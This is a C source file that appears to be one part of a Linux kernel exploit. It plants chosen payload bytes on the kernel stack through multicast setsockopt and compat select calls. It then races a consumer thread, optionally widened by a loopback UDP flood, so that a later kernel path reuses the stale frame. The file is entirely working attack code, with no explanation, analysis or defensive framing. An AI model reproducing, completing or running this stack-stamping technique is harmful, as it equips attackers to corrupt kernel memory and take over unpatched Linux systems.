#define _GNU_SOURCE

#include <errno.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>

#include "offset.h"
#include "kernelsnitch/utils.h"

extern atomic_int g_consumer_go;
extern atomic_int g_consumer_done;
extern atomic_int g_consumer_phase_done;
extern atomic_ullong g_consumer_delay_ticks;
atomic_int g_stamp_completed;
static atomic_int g_stamp_last_rc;
static atomic_int g_stamp_last_errno;
static atomic_ullong g_stamp_syscall_ticks;
static atomic_ullong g_counter_freq;
atomic_ullong g_stamp_start_ticks;
atomic_ullong g_consumer_seen_ticks;
atomic_ullong g_consumer_svc_ticks;

#ifdef STAMP_UDP_BACKLOG_HOLD
static atomic_int g_flood_go;
static atomic_int g_flood_sent;
static struct sockaddr_in g_flood_dst;

static void *stamp_udp_flood(void *unused) {
    (void)unused;
    pin_to_core(STAMP_FLOOD_CORE);
    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (fd < 0)
        return NULL;
    while (!atomic_load(&g_flood_go))
        ;
#if defined(__aarch64__)
    uint64_t start, now;
    __asm__ volatile("mrs %0, cntvct_el0" : "=r"(start));
    do {
        __asm__ volatile("mrs %0, cntvct_el0" : "=r"(now));
    } while (now - start < STAMP_FLOOD_DELAY_TICKS);
#endif
    unsigned char packet[STAMP_FLOOD_PACKET_BYTES];
    memset(packet, 0x46, sizeof(packet));
    for (int i = 0; i < STAMP_FLOOD_PACKETS; i++) {
        if (sendto(fd, packet, sizeof(packet), MSG_DONTWAIT,
                   (struct sockaddr *)&g_flood_dst,
                   sizeof(g_flood_dst)) >= 0)
            atomic_fetch_add(&g_flood_sent, 1);
    }
    close(fd);
    return NULL;
}
#endif

#ifndef STAMP_PAYLOAD_BYTES
#define STAMP_PAYLOAD_BYTES 0x50
#endif

#ifndef __NR__newselect
#define __NR__newselect 142
#endif
#ifndef STAMP_NFDS
#define STAMP_NFDS 320
#endif
#ifndef STAMP_WAITER_OFF
#define STAMP_WAITER_OFF 0x30
#endif
#ifndef STAMP_SETSOCKOPT_OFF
#define STAMP_SETSOCKOPT_OFF 0x34
#endif
#ifndef STAMP_VIA_SELECT
#define STAMP_VIA_SELECT 1
#endif
#ifndef STAMP_SOCKTYPE
#define STAMP_SOCKTYPE 0       /* 0=SOCK_DGRAM 1=SOCK_STREAM 2=SOCK_RAW */
#endif
#ifndef STAMP_HOLD
#define STAMP_HOLD 1
#endif
#ifndef STAMP_CONTINUOUS
#define STAMP_CONTINUOUS 0
#endif
#ifndef STAMP_THEN_PARK
#define STAMP_THEN_PARK 0
#endif
#ifndef STAMP_SYNC_FINAL
#define STAMP_SYNC_FINAL 0
#endif
#ifndef STAMP_INLINE_RETURN
#define STAMP_INLINE_RETURN 0
#endif
#ifndef STAMP_BURST
#define STAMP_BURST 64
#endif
#ifndef STAMP_WFE_PARK
#define STAMP_WFE_PARK 0
#endif

#define STAMP_MAX_NFDS 4096
#define STAMP_MAX_SET_BYTES (STAMP_MAX_NFDS / 8)
#define STAMP_GSR_LEN 264

static const int g_stamp_nfds = STAMP_NFDS;
static const int g_stamp_waiter_off = STAMP_WAITER_OFF;
/* 0: IPv6 setsockopt, 1: compat select, 2: native IPv4 ping setsockopt. */
enum stamp_method {
    STAMP_METHOD_IPV6_SETSOCKOPT = 0,
    STAMP_METHOD_COMPAT_SELECT = 1,
    STAMP_METHOD_IPV4_PING_SETSOCKOPT = 2,
};

static const int g_stamp_method = STAMP_VIA_SELECT;
static const int g_stamp_socktype = STAMP_SOCKTYPE;

static __attribute__((noreturn)) void stamp_park_forever(void) {
#if defined(__aarch64__) && STAMP_WFE_PARK
    /* WFE is an EL0 hint and does not enter the kernel.  Repeating it keeps
     * the stale syscall frame untouched while avoiding a permanent hot spin. */
    for (;;)
        __asm__ volatile("sevl\n\twfe\n\twfe" ::: "memory");
#else
    for (volatile uint64_t i = 0;; i++)
        ;
#endif
}

static __attribute__((noreturn)) void stamp_raw_release_and_park(
        int fd, int level, const void *buffer) {
#if defined(__aarch64__)
    register long r0 __asm__("x0") = fd;
    register long r1 __asm__("x1") = level;
    register long r2 __asm__("x2") = MCAST_JOIN_SOURCE_GROUP;
    register long r3 __asm__("x3") = (long)buffer;
    register long r4 __asm__("x4") = STAMP_GSR_LEN;
    register long r8 __asm__("x8") = __NR_setsockopt;
    __asm__ volatile(
        "svc #0\n"
        "mov w9, #1\n"
        "stlr w9, [%[go]]\n"
        "1: b 1b\n"
        : "+r"(r0)
        : "r"(r1), "r"(r2), "r"(r3), "r"(r4), "r"(r8),
          [go] "r"(&g_consumer_go)
        : "x9", "memory", "cc");
#else
    (void)fd;
    (void)level;
    (void)buffer;
    abort();
#endif
    __builtin_unreachable();
}

struct old_timeval32 {
    int32_t tv_sec;
    int32_t tv_usec;
};

static void widen_fdtable(int nfds) {
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0 &&
        rl.rlim_cur < (rlim_t)(nfds + 128)) {
        rl.rlim_cur = (rl.rlim_max < (rlim_t)(nfds + 128))
                          ? rl.rlim_max
                          : (rlim_t)(nfds + 128);
        setrlimit(RLIMIT_NOFILE, &rl);
    }

    int pfd[2];
    if (pipe(pfd) != 0) {
        pr_warning("Stamp: pipe failed errno=%d\n", errno);
        return;
    }
    int wr = nfds + 64;
    if (dup2(pfd[1], wr) < 0)
        pr_warning("Stamp: dup2 write-end failed errno=%d\n", errno);
    if (pfd[1] != wr)
        close(pfd[1]);
    for (int fd = 3; fd < nfds; fd++) {
        if (fd == pfd[0] || fd == wr)
            continue;
        dup2(pfd[0], fd);
    }
}

static void stamp_select(uint64_t *buf) {
    int nfds = g_stamp_nfds;
    if (nfds < 64) nfds = 64;
    if (nfds > STAMP_MAX_NFDS) nfds = STAMP_MAX_NFDS;
    int set_bytes = nfds / 8;
    int total = 3 * set_bytes;
    int woff = g_stamp_waiter_off;
    if (woff < 0) woff = 0;
    if (woff > total) woff = total;

    const uint8_t *payload = (const uint8_t *)buf;

    uint8_t flat[3 * STAMP_MAX_SET_BYTES];
    memset(flat, 0, (size_t)total);
    {
        size_t avail = (size_t)(total - woff);
        size_t n = STAMP_PAYLOAD_BYTES < avail ? STAMP_PAYLOAD_BYTES : avail;
        memcpy(flat + woff, payload, n);
    }

    widen_fdtable(nfds);
    pr_info("Stamp: select n=%d, waiter at +0x%x\n", nfds, woff);

    for (;;) {
        struct old_timeval32 tv = { 0, 50000 };
        uint8_t work[3 * STAMP_MAX_SET_BYTES];
        memcpy(work, flat, (size_t)total);
        atomic_store(&g_consumer_go, 1);
        syscall(__NR__newselect, nfds, work, work + set_bytes,
                work + 2 * set_bytes, &tv);
    }
}

void prepare_stamp_hold(uint64_t *buf) {
#ifdef STAMP_PING_SOURCE_HOLD
    if (buf[STAMP_SOURCE_SKIP_WORD]) {
        pr_info("Stamp: reusing parked ping source-list holders\n");
        return;
    }

    int holder_slots = (STAMP_PING_SOURCE_COUNT + STAMP_PING_SOURCE_BATCH - 1) /
                       STAMP_PING_SOURCE_BATCH;
    int *source_hold_fds = calloc((size_t)holder_slots, sizeof(int));
    int source_hold_count = 0;
    int source_hold_sockets = 0;
    if (source_hold_fds) {
        for (int base = 0; base < STAMP_PING_SOURCE_COUNT;
             base += STAMP_PING_SOURCE_BATCH) {
            int hfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
            if (hfd < 0)
                break;
            struct group_req gr;
            memset(&gr, 0, sizeof(gr));
            gr.gr_interface = 1;
            struct sockaddr_in *g = (struct sockaddr_in *)&gr.gr_group;
            g->sin_family = AF_INET;
            g->sin_addr.s_addr = htonl(0xefff0002U);
            if (setsockopt(hfd, IPPROTO_IP, MCAST_JOIN_GROUP,
                           &gr, sizeof(gr)) != 0) {
                close(hfd);
                break;
            }

            int nsrc = STAMP_PING_SOURCE_COUNT - base;
            if (nsrc > STAMP_PING_SOURCE_BATCH)
                nsrc = STAMP_PING_SOURCE_BATCH;
            size_t gf_size = GROUP_FILTER_SIZE(nsrc);
            struct group_filter *gf = calloc(1, gf_size);
            if (!gf) {
                close(hfd);
                break;
            }
            gf->gf_interface = 1;
            g = (struct sockaddr_in *)&gf->gf_group;
            g->sin_family = AF_INET;
            g->sin_addr.s_addr = htonl(0xefff0002U);
            gf->gf_fmode = MCAST_INCLUDE;
            gf->gf_numsrc = (uint32_t)nsrc;
            for (int j = 0; j < nsrc; j++) {
                struct sockaddr_in *s =
                    (struct sockaddr_in *)&gf->gf_slist[j];
                s->sin_family = AF_INET;
                s->sin_addr.s_addr =
                    htonl(0x0a000001U + (uint32_t)(base + j));
            }
            int frc = setsockopt(hfd, IPPROTO_IP, MCAST_MSFILTER,
                                 gf, (socklen_t)gf_size);
            free(gf);
            if (frc != 0) {
                close(hfd);
                break;
            }
            source_hold_fds[source_hold_sockets++] = hfd;
            source_hold_count += nsrc;
        }
    }
    pr_info("Stamp: prepared %d ping sources across %d holders before "
            "creating the stale waiter\n",
            source_hold_count, source_hold_sockets);
#else
    (void)buf;
#endif
}

static void stamp_setsockopt(uint64_t *buf) {
    int off = g_stamp_waiter_off;
    int maxoff = STAMP_GSR_LEN - (int)STAMP_PAYLOAD_BYTES;
    if (off < 0) off = 0;
    if (off > maxoff) off = maxoff;

    int ipv4_ping = g_stamp_method == 2;
    int family = ipv4_ping ? AF_INET : AF_INET6;
    int st = ipv4_ping ? SOCK_DGRAM
           : (g_stamp_socktype == 1) ? SOCK_STREAM
           : (g_stamp_socktype == 2) ? SOCK_RAW : SOCK_DGRAM;
    int proto = ipv4_ping ? IPPROTO_ICMP
              : (g_stamp_socktype == 2) ? IPPROTO_RAW : 0;
#ifdef STAMP_UDP_BACKLOG_HOLD
    if (ipv4_ping)
        proto = IPPROTO_UDP;
#endif
    int level = ipv4_ping ? IPPROTO_IP : IPPROTO_IPV6;
    int fd = socket(family, st, proto);
    if (fd < 0) {
        pr_warning("Do_stamp_stack: socket failed errno=%d\n", errno);
        return;
    }
#ifdef STAMP_UDP_BACKLOG_HOLD
    pthread_t flood_thread;
    int flood_started = 0;
    if (ipv4_ping) {
        int rcvbuf = 4 * 1024 * 1024;
        (void)setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));
        struct sockaddr_in local;
        memset(&local, 0, sizeof(local));
        local.sin_family = AF_INET;
        local.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        local.sin_port = 0;
        socklen_t local_len = sizeof(local);
        if (bind(fd, (struct sockaddr *)&local, sizeof(local)) == 0 &&
            getsockname(fd, (struct sockaddr *)&local, &local_len) == 0) {
            g_flood_dst = local;
            atomic_store(&g_flood_go, 0);
            atomic_store(&g_flood_sent, 0);
            flood_started = pthread_create(&flood_thread, NULL,
                                           stamp_udp_flood, NULL) == 0;
        }
    }
#endif
    uint8_t buffer[STAMP_GSR_LEN];
    memset(buffer, 0, sizeof(buffer));
    memcpy(buffer + off, buf, STAMP_PAYLOAD_BYTES);
    if (ipv4_ping) {
      /* group_req.gr_group and gr_source are sockaddr_storage objects. */
      buffer[0] = 1; /* loopback ifindex, little-endian */
        buffer[8] = AF_INET;
        buffer[12] = 239; buffer[13] = 255; buffer[14] = 0; buffer[15] = 1;
        buffer[136] = AF_INET;
        buffer[140] = 1; buffer[141] = 1; buffer[142] = 1; buffer[143] = 1;
    }
#ifdef STAMP_FINAL_FRESH_GROUP
    uint8_t warm_buffer[STAMP_GSR_LEN];
    memcpy(warm_buffer, buffer, sizeof(warm_buffer));
    /* Warm-ups join 239.255.0.1.  The synchronized final call uses a fresh
     * group, forcing the full allocation/IGMP path after copy_from_user
     * instead of taking the fast duplicate-source EADDRNOTAVAIL exit. */
    buffer[15] = 2;
#endif

    pr_info("Stamp: %s setsockopt live-frame, waiter at +0x%x payload=%u\n",
            ipv4_ping ? "IPv4 ping" : "IPv6", off,
            (unsigned)STAMP_PAYLOAD_BYTES);

    if (STAMP_HOLD) {
#ifdef STAMP_TWO_PHASE
        uint8_t second_buffer[STAMP_GSR_LEN];
        memcpy(second_buffer, buffer, sizeof(second_buffer));
        uint64_t second_payload[8];
        memcpy(second_payload, buf, sizeof(second_payload));
        second_payload[0] = buf[10];
        second_payload[1] = 0;
        second_payload[2] = buf[11];
        memcpy(second_buffer + off, second_payload, sizeof(second_payload));

        for (int phase = 1; phase <= 2; phase++) {
            uint8_t *phase_buffer = phase == 1 ? buffer : second_buffer;
            for (int i = 0; i < STAMP_BURST; i++) {
                int warm_rc = setsockopt(fd, level, MCAST_JOIN_SOURCE_GROUP,
                                         phase_buffer, STAMP_GSR_LEN);
                atomic_store(&g_stamp_last_rc, warm_rc);
                atomic_store(&g_stamp_last_errno, errno);
                atomic_fetch_add(&g_stamp_completed, 1);
            }
            uint64_t start_ticks, end_ticks, freq;
#if defined(__aarch64__)
            __asm__ volatile("mrs %0, cntfrq_el0" : "=r"(freq));
            __asm__ volatile("mrs %0, cntvct_el0" : "=r"(start_ticks));
#else
            freq = start_ticks = 0;
#endif
            atomic_store(&g_counter_freq, freq);
            atomic_store(&g_stamp_start_ticks, start_ticks);
            atomic_store(&g_consumer_go, phase);
            int rc = setsockopt(fd, level, MCAST_JOIN_SOURCE_GROUP,
                                phase_buffer, STAMP_GSR_LEN);
#if defined(__aarch64__)
            __asm__ volatile("mrs %0, cntvct_el0" : "=r"(end_ticks));
#else
            end_ticks = start_ticks;
#endif
            atomic_store(&g_stamp_syscall_ticks, end_ticks - start_ticks);
            atomic_store(&g_stamp_last_rc, rc);
            atomic_store(&g_stamp_last_errno, errno);
            atomic_fetch_add(&g_stamp_completed, 1);
            if (phase == 1) {
                while (atomic_load(&g_consumer_phase_done) < 1)
                    ;
                atomic_store(&g_consumer_go, 0);
            }
        }
        stamp_park_forever();
#else
#ifdef STAMP_DIAGNOSTIC_PATTERN
        for (int i = 0; i < STAMP_BURST; i++) {
            int rc = setsockopt(fd, level, MCAST_JOIN_SOURCE_GROUP,
                                buffer, STAMP_GSR_LEN);
            atomic_store(&g_stamp_last_rc, rc);
            atomic_store(&g_stamp_last_errno, errno);
            atomic_fetch_add(&g_stamp_completed, 1);
        }
        atomic_store(&g_consumer_go, 1);
        for (volatile uint64_t i = 0;; i++)
            ;
#else
        if (STAMP_INLINE_RETURN) {
            /* The first instruction sequence after the raw syscall releases
             * the consumer and parks in userspace, minimizing stale-stack
             * reuse without entering the kernel again.
             */
            stamp_raw_release_and_park(fd, level, buffer);
        } else if (STAMP_SYNC_FINAL) {
            /* Release the consumer immediately before one final syscall.
             * A short target-specific consumer delay can then land
             * sched_setattr after copy_from_user populated the stack object,
             * while do_ip_setsockopt still owns that frame.
             */
            for (int i = 0; i < STAMP_BURST; i++) {
                int warm_rc = setsockopt(fd, level, MCAST_JOIN_SOURCE_GROUP,
#ifdef STAMP_FINAL_FRESH_GROUP
                                         warm_buffer, STAMP_GSR_LEN);
#else
                                         buffer, STAMP_GSR_LEN);
#endif
                atomic_store(&g_stamp_last_rc, warm_rc);
                atomic_store(&g_stamp_last_errno, errno);
                atomic_fetch_add(&g_stamp_completed, 1);
            }
#ifdef STAMP_PING_TOMB_HOLD
            /* Add one exclude-mode membership on the target socket.  With
             * the aggregate include-source list already populated, this
             * moves every active source to the interface tomb list.  The
             * final group_source_req switches this socket back to include
             * mode; sf_setstate() then reconciles sources against the tomb
             * list after the 264-byte stack copy. */
            int prep_rc = setsockopt(fd, level, MCAST_JOIN_GROUP,
                                     buffer, sizeof(struct group_req));
            pr_info("Stamp: tomb hold prepare rc=%d errno=%d\n",
                    prep_rc, errno);
#endif
            uint64_t start_ticks, end_ticks, freq;
#ifdef STAMP_UDP_BACKLOG_HOLD
            if (flood_started) {
                atomic_store(&g_flood_go, 1);
                while (atomic_load(&g_flood_sent) < STAMP_FLOOD_WARM_PACKETS)
                    ;
            }
#endif
#if defined(__aarch64__)
            __asm__ volatile("mrs %0, cntfrq_el0" : "=r"(freq));
            __asm__ volatile("mrs %0, cntvct_el0" : "=r"(start_ticks));
#else
            freq = start_ticks = 0;
#endif
            atomic_store(&g_counter_freq, freq);
            atomic_store(&g_stamp_start_ticks, start_ticks);
            atomic_store(&g_consumer_go, 1);
            int rc = setsockopt(fd, level,
#ifdef STAMP_PING_TOMB_HOLD
                                MCAST_LEAVE_SOURCE_GROUP,
#else
                                MCAST_JOIN_SOURCE_GROUP,
#endif
                                buffer, STAMP_GSR_LEN);
#if defined(__aarch64__)
            __asm__ volatile("mrs %0, cntvct_el0" : "=r"(end_ticks));
#else
            end_ticks = start_ticks;
#endif
            atomic_store(&g_stamp_syscall_ticks, end_ticks - start_ticks);
            atomic_store(&g_stamp_last_rc, rc);
            atomic_store(&g_stamp_last_errno, errno);
            atomic_fetch_add(&g_stamp_completed, 1);
#ifdef STAMP_UDP_BACKLOG_HOLD
            if (flood_started)
                pthread_join(flood_thread, NULL);
#endif
            for (volatile uint64_t i = 0;; i++)
                ;
        } else if (STAMP_THEN_PARK) {
            /* Do not release the consumer during do_ip_setsockopt's memset or
             * copy_from_user window.  Leave the final stamped frame stale,
             * signal from userspace, then avoid every further syscall.
             */
            for (int i = 0; i < STAMP_BURST; i++) {
                int rc = setsockopt(fd, level, MCAST_JOIN_SOURCE_GROUP,
                                    buffer, STAMP_GSR_LEN);
                atomic_store(&g_stamp_last_rc, rc);
                atomic_store(&g_stamp_last_errno, errno);
                atomic_fetch_add(&g_stamp_completed, 1);
            }
            atomic_store(&g_consumer_go, 1);
            for (volatile uint64_t i = 0;; i++)
                ;
        } else if (STAMP_CONTINUOUS) {
            for (int i = 0; i < STAMP_BURST; i++) {
                int rc = setsockopt(fd, level, MCAST_JOIN_SOURCE_GROUP,
                                    buffer, STAMP_GSR_LEN);
                atomic_store(&g_stamp_last_rc, rc);
                atomic_store(&g_stamp_last_errno, errno);
                atomic_fetch_add(&g_stamp_completed, 1);
            }
            atomic_store(&g_consumer_go, 1);
            while (!atomic_load(&g_consumer_done)) {
                int rc = setsockopt(fd, level, MCAST_JOIN_SOURCE_GROUP,
                                    buffer, STAMP_GSR_LEN);
                atomic_store(&g_stamp_last_rc, rc);
                atomic_store(&g_stamp_last_errno, errno);
                atomic_fetch_add(&g_stamp_completed, 1);
            }
            close(fd);
            return;
        } else {
            setsockopt(fd, level, MCAST_JOIN_SOURCE_GROUP, buffer,
                       STAMP_GSR_LEN);
            atomic_store(&g_consumer_go, 1);
            for (volatile uint64_t i = 0;; i++) {
                if ((i & 0xffffff) == 0xffffff)
                    setsockopt(fd, level, MCAST_JOIN_SOURCE_GROUP, buffer,
                               STAMP_GSR_LEN);
            }
        }
#endif
#endif
    }

    uint64_t times = 10000000;
    while (times--) {
        atomic_store(&g_consumer_go, 1);
        setsockopt(fd, level, MCAST_JOIN_SOURCE_GROUP, buffer,
                   STAMP_GSR_LEN);
    }
    close(fd);
}

void do_stamp_stack(uint64_t *buf) {
    if (g_stamp_method == STAMP_METHOD_COMPAT_SELECT)
        stamp_select(buf);
    else
        stamp_setsockopt(buf);
}

void log_stamp_config(void) {
    pr_info("Stage stamp: method=%d waiter_off=%d payload=%d "
            "then_park=%d sync_final=%d inline_return=%d "
            "burst=%d\n",
            g_stamp_method, g_stamp_waiter_off, STAMP_PAYLOAD_BYTES,
            STAMP_THEN_PARK, STAMP_SYNC_FINAL, STAMP_INLINE_RETURN,
            STAMP_BURST);
}

void log_stamp_status(void) {
    unsigned long long start = atomic_load(&g_stamp_start_ticks);
    unsigned long long seen = atomic_load(&g_consumer_seen_ticks);
    unsigned long long svc = atomic_load(&g_consumer_svc_ticks);
    pr_info("Stage stamp status: completed=%d last_rc=%d last_errno=%d "
            "delay_ticks=%llu syscall_ticks=%llu freq=%llu "
            "seen_from_start=%llu svc_from_start=%llu"
#ifdef STAMP_UDP_BACKLOG_HOLD
            " flood_sent=%d"
#endif
            "\n",
            atomic_load(&g_stamp_completed), atomic_load(&g_stamp_last_rc),
            atomic_load(&g_stamp_last_errno),
            (unsigned long long)atomic_load(&g_consumer_delay_ticks),
            (unsigned long long)atomic_load(&g_stamp_syscall_ticks),
            (unsigned long long)atomic_load(&g_counter_freq),
            seen >= start ? seen - start : 0,
            svc >= start ? svc - start : 0
#ifdef STAMP_UDP_BACKLOG_HOLD
            , atomic_load(&g_flood_sent)
#endif
            );
}
